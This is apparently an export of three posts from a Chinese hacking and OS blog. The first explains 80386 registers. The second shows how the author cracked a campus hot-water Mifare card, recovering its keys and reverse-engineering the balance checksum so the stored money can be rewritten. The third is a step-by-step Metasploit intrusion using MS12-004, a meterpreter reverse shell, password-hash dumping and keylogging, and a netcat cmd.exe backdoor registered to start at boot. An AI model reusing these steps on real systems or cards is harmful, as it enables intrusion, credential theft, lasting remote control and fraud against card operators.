    <content type="text"><![CDATA[写这篇文章，完全是因为学习保护模式需要这些知识，读者完全可以走马观花，大致看看有什么内容，知道需要的时候来查这篇文章就可以了，完全没有必要抵抗着困意非要把这篇文章认真看完， 记住里面每一个寄存器里每一位的定义，但是以后的文章如果需要，一定要记得回来查查相关的内容。 80386共提供7种类型的32位寄存器，如下： 通用寄存器 (EAX、EBX、ECX、EDX、ESP、EBP、ESI、EDI) 段寄存器(CS、SS、DS、ES、FS、GS) 指令指针寄存器和标志寄存器(EIP、EFLAGS) 系统表寄存器(GDTR、IDTR、LDTR、TR) 控制寄存器(CR0、CR1、CR2、CR3、CR4) 调试寄存器(DR0、DR1、DR2、DR3、DR4、DR5、DR6、DR7) 测试寄存器(TR6、TR7) 其中后三类寄存器是80386以后的CPU才有的，以前的CPU完全没有。下图是前四类寄存器的大致示意图：本文只对这些寄存器做一个大致的介绍，其中有些特殊且有较大意义的寄存器，会另文介绍。 一、通用寄存器一组八个通用寄存器是对8086/80286通用寄存器的32位扩展，其用法与在8086/80286中相似，支持8位、16位、32位操作，进行32位操作是，寄存器名称前面冠以“E”。这八个寄存器的名称如下：EAX（累加器）、EBX（基址）、ECX（计数）、EDX（数据）、ESP（栈指针）、EBP（基址指针）、ESI（源变址）、EDI（目的变址）。 二、段寄存器80386比8086/80286增加了两个段寄存器FS、GS。除CS支持代码段，SS支持堆栈段外，程序员可以利用其它的所有段寄存器支持数据段。每个段寄存器对应这一个64位高速缓存器（有些资料中说有96位，但值使用其中的64位），这在8086中是没有的（在80286中为48位），它的具体作用将另文介绍。 三、指令指针寄存器和标志寄存器指令寄存器EIP是对8086/80286指令指针寄存器的32位扩展，它包含着待执行指令的32位偏移量，该值总是相对CS所代表的段基址而言的。 标志寄存器也是对8086/80286标志寄存器的32位扩展，其定义如下（这张图截自Intel关于IA32架构的最新文档）：其中OF、DF、IF、TF、SF、ZF、AF、PF和CF在8086中就已经存在，请参考相关资料。 IOPL（I/O Privilege Level）是从80286开始出现的，占2个bit表示I/O特权级，如果当前特权级小于或等于IOPL，则可以执行I/O操作，否则将出现一个保护性异常。IOPL只能由特权级为0的程序或任务来修改。NT（Nested Task）也是从80286开始出现的，表示嵌套任务，用于控制中断返回指令IRET，当NT=0时，用堆栈中保存的值恢复EFLAGS、CS和EIP，从而实现返回；若NT=1，则通过任务切换实现中断返回。下面的标志位是80386以后的CPU才有的标志。 VM（Virtual-8086 mode）表示虚拟8086模式，如果VM被置位且80386已出于保护模式下，则CPU切换到虚拟8086模式，此时，对段的任何操作又回到了实模式，如同在8086下运行一样。 RF（Resume flag）表示恢复标志(也叫重启标志)，与调试寄存器一起用于断点和单步操作，当RF＝1 时，下一条指令的任何调试故障将被忽略，不产生异常中断。当RF=0时，调试故障被接受，并产生异常中断。用于调试失败后，强迫程序恢复执行，在成功执行每条指令后，RF自动复位。 AC（Alignment check）表示对齐检查。这个标志是80486以后的CPU才有的。当AC=1且CR0中的AM=1时，允许存储器进行地址对齐检查，若发现地址未对齐，将产生异常中断。所谓地址对齐，是指当访问一个字（2字节长）时，其地址必须是偶数（2的倍数），当访问双字（4字节长）时，其地址必须是4的倍数。 但是只有运行在特权级3的程序才执行地址对齐检查，特权级0、1、2忽略该标志。VIF（Virtual interrupt flag）表示虚拟中断标志。以下的三个标志是Pentium以后的CPU才有的。当VIF=1时，可以使用虚拟中断，当VIF=0时不能使用虚拟中断。该标志要和下面的VIP和CR4中的VME配合使用。VIP（Virtual interrupt pending flag）表示虚拟中断挂起标志。当VIP=1时，VIF有效，VIP=0时VIF无效。ID（Identification flag）表示鉴别标志。该标志用来只是Pentium CPU是否支持CPUID的指令。实际上，如果不编写操作系统，大部分标志可能很难得用到一次，有个印象就好了，用到了再去查不迟。 四、系统表寄存器80386 中有4个系统表寄存器，分别是 全局描述符表寄存器(GDTR) 中断描述符表寄存器(IDTR) 局部描述符表寄存器(LDTR) 任务状态寄存器(TR)系统表寄存器用于在保护方式下，管理4 个系统表，由于只能在保护方式下使用，因此又称为保护方式寄存器。有关描述附表的问题，另文介绍。 五、控制寄存器80386的控制寄存器有4个,其中CR1保留以后使用，从Pentium开始，又增加了一个CR4，CR0的低16位包含了与80286的MSW一致的位定义，保持了和80286的兼容，同时也兼容了从80286开始的两条指令LMSW/SMSW，其基本定义如下： CR0中各位含义如下： PE（Protection Enable）保护模式允许，PE=0表示CPU工作在实模式，PE=1表示CPU工作在保护模式 MP（Monitor Coprocessor）监控协处理器，MP=1表示协处理器在工作，MP=0表示协处理器未工作。EM（Emulation）协处理器仿真，当MP=0，EM=1时，表示正在使用软件仿真协处理器工作。 TS（Task Switched）任务转换，每当进行任务转换时，TS=1，任务转换完毕，TS=0。TS=1时不允许协处理器工作。 以上4个定义从80286开始，下面的2个定义从80386开始存在 ET（Extension Type）处理器扩展类型，反映了所扩展的协处理器的类型，ET=0为80287，ET=1为80387。 PG（Paging）页式管理机制使能，PG=1时页式管理机制工作，否则不工作。从80486开始又增加了如下位定义。 NE（Numeric Error）数值异常中断控制，NE=1时，如果运行协处理器指令发生故障，则用异常中断处理，NE=0时，则用外部中断处理。 WP（Write Protect）写保护，当WP=1时，对只读页面进行写操作会产生页故障。AM（Alignment Mask）对齐标志，AM=1时，允许对齐检查，AM=0时不允许，关于对齐，在EFLAGS的AC标志时介绍过，在80486以后的CPU中，CPU进行对齐检查需要满足三个条件，AC=1、AM=1并且当前特权级为3。 NW（Not Write-through）和CD（Cache Disable），这两个标志都是用来控制CPU内部的CACHE的，当NW=0且CD=0时，CACHE使能，其它的组合说起来比较复杂，如果有读者真的想搞清楚的话，可以参阅《Intel? 64 and IA-32 Architectures》中的“Software Developer’s Manual Volume 3A”这一册，在第10章对这两个标志的各种组合有比较详细的说明。 CR1保留未用；CR2存放引起页故障的线性地址，只有在PG=1时，CR2才有效，当页故障处理程序被激活时，压入页故障处理程序堆栈中的错误码提供页故障的状态信息。CR3的bit12–bit31存放页目录的基地址，因为也目录总是页对齐的（一页为4K），所以页目录基地址从bit12开始就可以了。只有当CR0中的PG=1时，CR3的页目录基地址才有效。 从80486开始，在CR3的低12位定义了两个控制位，如下：PCD（Page-level Cache Disable）页CACHE禁止，当PCD=0时，页目录表进行高速缓存，PCD=1时，不进行高速缓存；该位控制PCD引脚控制外部CACHE工作还是不工作。 PWT（Page-level Writes Transparent），CACHE的写入分为透写（Write-Through）和回写（Write-Back）,80486以上的CPU内部的CACHE都是透写的，但对外部CACHE而言，允许某些页是回写的，而另一些页是透写的，当PWT=1时，外部CACHE对页目录进行透写，否则进行回写；此位驱动PWT引脚以控制外部CACHE是透写还是回写。CR4是从Pentium CPU开始出现的。 VME（Virtual-8086 Mode Extensions）虚拟8086方式扩展，VME=1允许使用虚拟8086扩展模式，否则只能使用80386/80486的虚拟8086模式。 PVI（Protected-Mode Virtual Interrupts）保护模式虚拟中断，PVI=1时，在保护模式下支持虚拟中断标志VIF(EFLAGS中)，PVI=0则不支持虚拟中断标志。 TSD（Time Stamp Disable）时间戳禁止，TSD=1时，允许在特权级为0的程序中执行RDTSC指令（读时间戳计数指令），TSD=0时，允许任何特权级执行RDTSC指令。 DE（Debugging Extensions）调试扩展， PSE（Page Size Extensions）页大小扩展，PSE=1时，页大小可以扩展到2M或4M，PSE=0时，页大小只能是4K.PAE（Physical Address Extension）物理地址扩展，PAE=1时，页物理地址可以扩展到36bits以上，PAE=0时只能用32bits的物理地址。MCE（Machine-Check Enable）硬件检查使能，Pentium以后的CPU有一种硬件检测功能，MCE=1时允许使用该功能。PGE（Page Global Enable）全局页使能，PGE=1时，允许使用全局页，PGE=0时禁止使用全局页。 PCE（Performance-Monitoring Counter Enable）性能监视计数器使能，当PCE=1时，允许在任何保护级下执行RDPMC指令，PCE=0时，只有特权级0的程序可以执行RDPMC指令。OSFXSR（Operating System Support for FXSAVE and FXRSTOR instructions）OSXMMEXCPT（Operating System Support for Unmasked SIMD Floating-Point Exceptions）VMXE（VMX-Enable Bit）VMX使能位，VMXE=1时，允许VMX操作。SMXE（SMX-Enable Bit）SMX使能位，SMXE=1时，允许SMX操作。OSXSAVE（XSAVE and Processor Extended States-Enable Bit） 六、调试寄存器一共有8个调试寄存器DR0–DR7，DR0-DR3可以分别设置4个断点的线性地址，DR4-DR5保留未用，DR6是断点状态寄存器，DR7是断点控制寄存器（包括断点类型、断点长度，断点开放/禁止） 七、测试寄存器 一共有8个测试寄存器TR0–TR7，TR0-TR2保留，TR3-TR5用作CACHE测试，TR6为命令测试寄存器，TR7为测试数据寄存器。]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>80386</tag>
        <tag>寄存器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[热水卡破解]]></title>
    <url>%2F2014%2FM1-card-crack%2F</url>
    <content type="text"><![CDATA[今天遇到点烦心事，只看了GDT（Global Descriptor Table）相关的内容，没有继续完成操作系统的引导部分。不过晚上热水卡没有钱了，刚好今天OS没有大的进展，顿时萌生了“自力更生，丰衣足食”的良好念头 :-) 。 M1卡，全程NXP Mifare1 卡。现在日常接触到的大部分都是M1卡。学校的所有卡，包括公交卡、甚至学校饭卡。 0X00 先从M1卡的结构说起吧 存储结构 M1卡分为16个扇区，每个扇区由4块（块0、块1、块2、块3）组成，（我们也将16个扇区的64个块按绝对地址编号为0~63，存贮结构如下图所示： 块0数据块0扇区0块1数据块1块2数据块2块3密码A 存取控制 密码B控制块3块0数据块4扇区1块1数据块5块2数据块6块3密码A 存取控制 密码B控制块7 一直到15 第0扇区的块0（即绝对地址0块），它用于存放厂商代码，已经固化，不可更改。 每个扇区的块0、块1、块2为数据块，可用于存贮数据。数据块可作两种应用： 用作一般的数据保存，可以进行读、写操作。 用作数据值，可以进行初始化值、加值、减值、读值操作。 每个扇区的块3为控制块，包括了密码A、存取控制、密码B。具体结构如下：A0 A1 A2 A3 A4 A5 FF 07 80 69 B0 B1 B2 B3 B4 B5密码A（6字节） 存取控制（4字节） 密码B（6字节） 每个扇区的密码和存取控制都是独立的，可以根据实际需要设定各自的密码及存取控制。存取控制为4个字节，共32位，扇区中的每个块（包括数据块和控制块）的存取条件是由密码和存取控制共同决定的，在存取控制中每个块都有相应的三个控制位,定义如下： 块0： C10 C20 C30 块1： C11 C21 C31 块2： C12 C22 C32 块3： C13 C23 C33 三个控制位以正和反两种形式存在于存取控制字节中，决定了该块的访问权限（如 进行减值操作必须验证KEY A，进行加值操作必须验证KEY B，等等）。三个控制 位在存取控制字节中的位置，以块0为例： &nbsp; 对块0的控制： bit 7 6 5 4 3 2 1 0 字节6 C20_b C10_b 字节7 C10 C30_b 字节8 C30 C20 字节9 ( 注： C10_b表示C10取反 ) &nbsp; 存取控制（4字节，其中字节9为备用字节）结构如下所示： bit 7 6 5 4 3 2 1 0 字节6 C23_b C22_b C21_b C20_b C13_b C12_b C11_b C10_b 字节7 C13 C12 C11 C10 C33_b C32_b C31_b C30_b 字节8 C33 C32 C31 C30 C23 C22 C21 C20 字节9 ( 注： _b表示取反 ) &nbsp; 6、数据块（块0、块1、块2）的存取控制如下： &nbsp; 控制位（X=0..2） 访 问 条 件 （对数据块 0、1、2） C1X C2X C3X Read Write Increment Decrement, transfer,Restore 0 0 0 KeyA|B KeyA|B KeyA|B KeyA|B 0 1 0 KeyA|B Never Never Never 1 0 0 KeyA|B KeyB Never Never 1 1 0 KeyA|B KeyB KeyB KeyA|B 0 0 1 KeyA|B Never Never KeyA|B 0 1 1 KeyB KeyB Never Never 1 0 1 KeyB Never Never Never 1 1 1 Never Never Never Never（KeyA|B 表示密码A或密码B，Never表示任何条件下不能实现） &nbsp; 例如：当块0的存取控制位C10 C20 C30=1 0 0时，验证密码A或密码B正确后可读； 验证密码B正确后可写；不能进行加值、减值操作。 &nbsp; 7、控制块块3的存取控制与数据块（块0、1、2）不同，它的存取控制如下： &nbsp; 密码A 存取控制 密码B C13 C23 C33 Read Write Read Write Read Write 0 0 0 Never KeyA|B KeyA|B Never KeyA|B KeyA|B 0 1 0 Never Never KeyA|B Never KeyA|B Never 1 0 0 Never KeyB KeyA|B Never Never KeyB 1 1 0 Never Never KeyA|B Never Never Never 0 0 1 Never KeyA|B KeyA|B KeyA|B KeyA|B KeyA|B 0 1 1 Never KeyB KeyA|B KeyB Never KeyB 1 0 1 Never Never KeyA|B KeyB Never Never 1 1 1 Never Never KeyA|B Never Never Never例如：当块3的存取控制位C13 C23 C33=1 0 0时，表示： 密码A：不可读，验证KEYA或KEYB正确后，可写（更改）。 存取控制：验证KEYA或KEYB正确后，可读、可写。 密码B：验证KEYA或KEYB正确后，可读、可写。 知道这些东西已经足够了，就看怎么利用了。 0x01 破解key，读取数据 大多数卡中的数据除了第一扇区记录卡的信息外，剩下的15个扇区只有一个扇区记录金额和校验信息。剩下的扇区都是空数据。keyA keyB都是默认的。关于破解的算法08年国外已经有人公布 。运气好的话用Mifare Classic Offline Cracker就可以读到卡中16个扇区的数据。 但读到数据只是第一步，还需要知道那里存的是金额哪里是校验位，以及校验算法 0x02 破解校验算法 现在只看金额和校验数据的8个字节，通过两张卡都刷了两次得到以下数据 卡A 01 14 03 20 03 bd a8 f1 金额 957 01 14 03 20 03 bc a9 f1 金额 956 卡B 01 14 03 20 20 40 56 f1 金额 64 01 14 03 20 20 3f 29 f1 金额 63 这里需要对十六进制数据比较敏感。 0x03BD 两个字节就是 957 0x03bc是 956 2014年12月7日10:19:27 上次的工作只进行了一半，只知道了保存金额的位置。那就是0x384 0x285 这两个地址的数值。而且还是大端模式的存储。再来分析下。01 14 03 20 03 bd a8 f1 01 14 03 20 03 bc a9 f1 01 14 03 20 20 40 56 f1 01 14 03 20 20 3f 29 f1 似乎前四个字节和最后一个字节的数值不变。那么现在只有一个字节的数据定义不清楚了。 这就是传说中的校验数据。这一字节的数据验证金额是否合法。不合法的话就算前面两个字节再大，也会不认得。 那么怎么破解校验呢。03 bd a8 03 bc a9 20 40 56 20 3f 29 这三次的校验字节分别是 0xa8 0xa9 0x56 0x29 这和前面两个字节的数据有什么关系！！ 还是看不出来 。还是采集的数据太少了，我再找几张卡去。 A 、B、C、D张卡共刷了50次左右的数据 //卡A +101 14 03 20 03 bd a8 f101 14 03 20 03 bc a9 f1 01 14 03 20 01 d4 c3 f101 14 03 20 01 d3 c4 f101 14 03 20 01 d2 c5 f101 14 03 20 01 d1 c6 f101 14 03 20 01 d0 c7 f101 14 03 20 01 cf d8 f101 14 03 20 01 ce d9 f1 01 14 03 20 01 ba ad f101 14 03 20 01 b9 ae f101 14 03 20 01 b8 af f1 //卡B +3-1+3-1+3-101 14 03 20 20 40 56 f1 01 14 03 20 20 3f 29 f101 14 03 20 20 3e 28 f101 14 03 20 20 3d 2b f101 14 03 20 20 3c 2a f101 14 03 20 20 3b 2d f101 14 03 20 20 3a 2c f101 14 03 20 20 39 2f f1 01 14 03 20 20 1c 0a f101 14 03 20 20 1b 0d f101 14 03 20 20 1a 0c f1 //卡C +3-1-5-1+3-1-5-1+301 14 03 20 04 b6 a4 f101 14 03 20 04 b5 a7 f101 14 03 20 04 b4 a6 f101 14 03 20 04 b3 a1 f101 14 03 20 04 b2 a0 f101 14 03 20 04 b1 a3 f101 14 03 20 04 b0 a2 f101 14 03 20 04 af bd f101 14 03 20 04 ae bc f101 14 03 20 04 ad bf f1 //卡D -1+3-1+301 14 03 20 09 8f 90 f1 01 14 03 20 08 5d 43 f101 14 03 20 08 5c 42 f101 14 03 20 08 5b 45 f101 14 03 20 08 5a 44 f101 14 03 20 08 59 47 f1 01 14 03 20 08 3a 24 f101 14 03 20 08 39 27 f1 01 14 03 20 08 38 26 f1 看了几个小时，找到了规律。红色部分 3 -&gt;2 1-&gt;0 。 再看看其他的数据，都符合这个规律。0&lt;-&gt;1,2&lt;-&gt;3,4&lt;-&gt;5 …… E&lt;-&gt;F。&nbsp; 好了，校验字节的高四位已经明了。只剩下低四位了。 又看了几个小时，找到了最后一个字母的规律。结果是每张卡的校验算法都是不一样的。 卡A//卡A +1 01 14 03 20 01 d4 c3 f101 14 03 20 01 d3 c4 f101 14 03 20 01 d2 c5 f101 14 03 20 01 d1 c6 f101 14 03 20 01 d0 c7 f101 14 03 20 01 cf d8 f101 14 03 20 01 ce d9 f1 当金额每次减一 即01 d4、01 d3、 01 d1 、01 d0、 01 cf、01 ce 校验字节的低四位分别是 3、4、5、6、7、8、9 卡B01 14 03 20 20 3f 29 f101 14 03 20 20 3e 28 f101 14 03 20 20 3d 2b f101 14 03 20 20 3c 2a f101 14 03 20 20 3b 2d f101 14 03 20 20 3a 2c f101 14 03 20 20 39 2f f1 当金额每次减一，校验字节的低四位分别是 9、8、b、a、d、c、f 规律 ：+3-1+3-1+3-1……….. 卡C01 14 03 20 04 b6 a4 f101 14 03 20 04 b5 a7 f101 14 03 20 04 b4 a6 f101 14 03 20 04 b3 a1 f101 14 03 20 04 b2 a0 f101 14 03 20 04 b1 a3 f101 14 03 20 04 b0 a2 f101 14 03 20 04 af bd f101 14 03 20 04 ae bc f101 14 03 20 04 ad bf f1 规律 ：+3-1-5-1+3-1-5-1+3 ……….. 卡D01 14 03 20 08 5d 43 f101 14 03 20 08 5c 42 f101 14 03 20 08 5b 45 f101 14 03 20 08 5a 44 f101 14 03 20 08 59 47 f1 规律 ：-1+3-1+3 ……….. 为什吗只有B和D的校验算法是一样的！！！百思不得其解 ;-( 想了想应该有下面两个原因 校验结果很有可能和每张卡的ID有关，每张卡的ID在第0扇区存着，按照规定是不能改的。 校验结果和0x384 处的的值有关。 想想还是不可能，因为在0x384 值不变的情况下 0x386 第四位的值已经变了。 0X03 总结 现在已经可以改写卡的数据了，改完之后计算出相应的校验字节，写入0x386就可以。麻烦的是没有一个统一的算法算。只能先把每张卡的规律找出来。我觉得肯定有统一的算法，只是我没有总结出来而已。要分析清楚，需要采集大量的数据，没那个时间。反正目达到就好。有兴趣的同学还可以继续研究，比如说你的洗澡卡，洗衣卡，矿泉水卡，公交卡、、、 写入数据的时候需要keyA 或 keyB 。 就这样。 我可是好人，没有做坏事。为了免去不必要的麻烦，还是毕业之后在公布 吧 。]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>122U</tag>
        <tag>Mifare1</tag>
        <tag>RFID</tag>
        <tag>热水卡</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Metasploit进行渗透测试]]></title>
    <url>%2F2012%2FPenetration-testing-with-Metasploit%2F</url>
    <content type="text"><![CDATA[声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。最近在玩Backtrack 5 ，就把最近学到的东西分享下,所有工具都是Backtrack 5 自带的，用到的工具 ： 大名鼎鼎的Metasploit Feamwork 还有 Netcat 要利用的漏洞：MS12-004 ，虽然漏洞是几个月前出的了，但这里只做渗透演示，重点在讲解工具的使用方法。废话不说，看步骤 ： 在控制台执行msfconsole启动Metasploit ， 输入命令search ms12_004我们来找找ms12-004漏洞的利用模块已经找到了，接下来使用该模块 输入命令 use exploits/windows/browser/ms12_004_midi接下来输入命令 show options ，显示该漏洞的基本信息，以及要设置的参数 设置参数： 输入命令 ：1234set SRVHOST 192.168.42.139Set PAYLOAD windows/meterpreter/reverse_tcpSet LHOST 192.168.42.130Set URIOATH / 最后 再输入show options ，查看是否设置好 已经OK了，开始渗透。执行命令 ：exploit 可以看到服务已经启动了，链接地址http://192.168.42.130:8080/在用Xp打开恶意链接地址 http://192.168.42.130:8080/ BackTrack 开始渗透，这边BT5已经有反应了 ，渗透成功~ 输入命令 sessions 我们看到有一个会话，会话的 ID 是1 ，开打开这个会话输入命令 sessions -i 1 这时，我们已经进入了Meterpreter Meterpreter 是一个很强大的 payload ， 具体说明输入 help 可以看到，meterpreter&gt; hashdump // 可以看到远程主机帐号和加密后的密码 这里再说几个常用的Meterpreter 命令 1234meterpreter&gt; keyscan_start //开启键盘记录meterpreter&gt; heyscan_dump // 查看键盘记录的内容meterpreter&gt; keyscan_stop // 关闭键盘记录meterpreter&gt; shell //看下图大家都懂的 meterpreter &gt; ps // 获取远程主机进程列表，比windows自带的任务管理器清晰多了 meterpreter&gt;screenshot// 截取远程桌面屏幕 meterpreter &gt; run vnc // 开启远程主机vnc 服务过一会，可以看到桌面，并且可以控制鼠标和键盘 好，下来我们来留后门，方便以后常来 ~先上传 nc.exe（netcant）到windows的systen32文件夹下Upload /pentest/windows-binaries/tools/nc.exe c:\windows\system32 已经成功了，下来我们将nc.exe加到注册表，让他开机自启动先查看注册表 reg enumkey -k HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run 已经可以看到注册表键值了下来加入注册表 reg setval -k HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run -v backdoor -d c:\windows\system32\nc.exe&quot;-L -d -p 443 cmd.exe&quot; 提示成功，看看XP的注册表 已经有了这个键值我们重启远程主机试下 输命令 reboot 由于远程主机已经关闭，显示链接断开 ，等xp重启后，我们试试留的后门Telnet 192.168.42.139 443 已经连接成功了 : ) .。刚接触BT5，各位见笑了 … 论坛有玩B5或者 Metasploit 的朋友可以联系我，求交流。 QQ :791628659 本文地址http://0x7c00.cn/2012/Penetration-testing-with-Metasploit/2012年4月10日11:34:16]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>Backtrack</tag>
        <tag>Breaker</tag>
        <tag>BT5</tag>
        <tag>Metasploit</tag>
        <tag>meterpreter</tag>
        <tag>Netcat</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
</search>